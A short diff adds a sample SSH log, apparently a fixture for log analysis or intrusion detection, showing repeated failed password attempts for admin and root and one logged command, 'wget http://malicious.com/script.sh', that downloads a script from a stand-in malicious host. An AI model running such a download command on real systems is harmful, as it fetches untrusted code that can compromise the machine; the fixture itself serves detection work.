@@ -1,0 +1,5 @@
+2024-01-01 10:00:01 Failed password for admin from 192.168.1.100 port 22
+2024-01-01 10:00:05 Failed password for admin from 192.168.1.100 port 22
+2024-01-01 10:00:10 Failed password for admin from 192.168.1.100 port 22
+2024-01-01 10:01:00 User executed command: wget http://malicious.com/script.sh
+2024-01-01 10:02:00 Failed password for root from 192.168.1.101 port 22
